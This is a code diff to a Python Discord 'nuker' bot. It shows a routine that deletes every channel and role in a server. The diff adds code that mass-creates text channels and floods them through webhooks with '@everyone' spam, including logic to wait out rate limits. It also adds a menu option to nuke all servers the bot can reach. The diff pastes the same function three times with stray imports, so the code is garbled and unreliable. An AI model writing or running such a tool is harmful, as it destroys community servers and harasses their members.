@@ -70,14 +70,126 @@ async def create_roles(guild, name):
             continue
     return created
 
-async def create_voice_channels(guild, name):
+import asyncio
+
+async def create_text_channels(guild, name):
     created = 0
-    for _ in range(200 - len(guild.channels)):
+    max_channels = 50
+    predefined_message = "@everyone you got ran!"
+    channels = []
+
+    # Delay between each channel creation (10 seconds for 50 channels)
+    delay_per_channel = 10 / max_channels  # 0.2 seconds
+
+    async def create_channel():
+        nonlocal created
         try:
-            await guild.create_voice_channel(name=name)
+            channel = await guild.create_text_channel(name=name)
+            channels.append(channel)
             created += 1
-        except:
-            continue
+            print(f"Created channel '{channel.name}'.")
+        except Exception as e:
+            print(f"Error creating channel: {e}")
+
+    # Create channels
+    create_tasks = [create_channel() for _ in range(max_channels - len(guild.text_channels))]
+    for task in create_tasks:
+        await task
+        await asyncio.sleep(delay_per_channel)
+
+    import asyncio
+
+import asyncio
+
+async def create_text_channels(guild, name):
+    created = 0
+    max_channels = 50
+    predefined_message = "@everyone you got ran!"
+    channels = []
+
+    # Delay between each channel creation
+    delay_per_channel = 10 / max_channels  # 0.2 seconds
+
+    async def create_channel():
+        nonlocal created
+        try:
+            channel = await guild.create_text_channel(name=name)
+            channels.append(channel)
+            created += 1
+            print(f"Created channel '{channel.name}'.")
+        except Exception as e:
+            print(f"Error creating channel: {e}")
+
+    # Create channels
+    create_tasks = [create_channel() for _ in range(max_channels - len(guild.text_channels))]
+    for task in create_tasks:
+        await task
+        await asyncio.sleep(delay_per_channel)
+
+import asyncio
+
+async def create_text_channels(guild, name):
+    created = 0
+    max_channels = 50
+    predefined_message = "@everyone you got ran!"
+    channels = []
+
+    # Function to create a channel
+    async def create_channel():
+        nonlocal created
+        try:
+            channel = await guild.create_text_channel(name=name)
+            channels.append(channel)
+            created += 1
+            print(f"Created channel '{channel.name}'.")
+        except Exception as e:
+            print(f"Error creating channel: {e}")
+
+    # Create a list of tasks for channel creation
+    create_tasks = [create_channel() for _ in range(max_channels - len(guild.text_channels))]
+
+    # Run all channel creation tasks concurrently
+    await asyncio.gather(*create_tasks)
+
+    async def send_messages(channel):
+        message_count = 0
+        webhooks = []
+
+        while message_count < 1000:  # Adjust the total number of messages to send
+            # Create a new webhook every time we reach 600 messages sent
+            if message_count % 600 == 0:
+                try:
+                    webhook = await channel.create_webhook(name=name)
+                    webhooks.append(webhook)
+                    print(f"Created a new webhook in channel '{channel.name}'.")
+                except Exception as e:
+                    print(f"Error creating webhook in channel '{channel.name}': {e}")
+                    break  # Exit if we can't create a new webhook
+
+            # Send messages through the available webhooks
+            if webhooks:
+                current_webhook = webhooks[message_count % len(webhooks)]
+                try:
+                    await current_webhook.send(predefined_message)
+                    message_count += 1
+                    print(f"Sent message {message_count} in channel '{channel.name}'.")
+
+                    # Small delay between sends
+                    await asyncio.sleep(0.1)  # Adjust as necessary
+
+                except Exception as e:
+                    if "429" in str(e):  # Handle rate limit
+                        print(f"Rate limit hit. Waiting before retrying...")
+                        await asyncio.sleep(10)  # Wait time when rate-limited
+                    else:
+                        print(f"Error sending message in channel '{channel.name}': {e}")
+
+        print(f"Finished sending messages in channel '{channel.name}'.")
+
+    # Create a list of tasks for sending messages
+    tasks = [send_messages(channel) for channel in channels]
+    await asyncio.gather(*tasks)
+
     return created
 
 async def nuke_guild(guild):
@@ -88,8 +200,8 @@ async def nuke_guild(guild):
     print(f'{m}Delete Channels:{b}{deleted_channels}')
     delete_roles = await delete_all_roles(guild)
     print(f'{m}Delete Roles:{b}{delete_roles}')
-    created_channels = await create_voice_channels(guild,name)
-    print(f'{m}Create Voice Channels:{b}{created_channels}')
+    created_channels = await create_text_channels(guild,name)
+    print(f'{m}Create Text Channels:{b}{created_channels}')
     #created_roles = await created_roles(guild,name)
     #print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
@@ -115,7 +227,7 @@ while True:
     {W}└─[1] {m}- {r}Nuke of all servers.
     {W}└─[2] {m}- {r}Nuke only one server.  
     {W}└─[3] {m}- {r}Exit
-{w}====>{r}''')
+{w}====>{r}''')#perk made this shit
         client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
         if choice_type == '1':
             @client.event
@@ -145,7 +257,7 @@ while True:
                 input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
             else:
                 input(f'{r}{error}\n{b}Press enter for return...')
-            continue
+            continue#perk made this shit
     elif choice == '2':
         print(f'{dr}Exit...')
         exit()
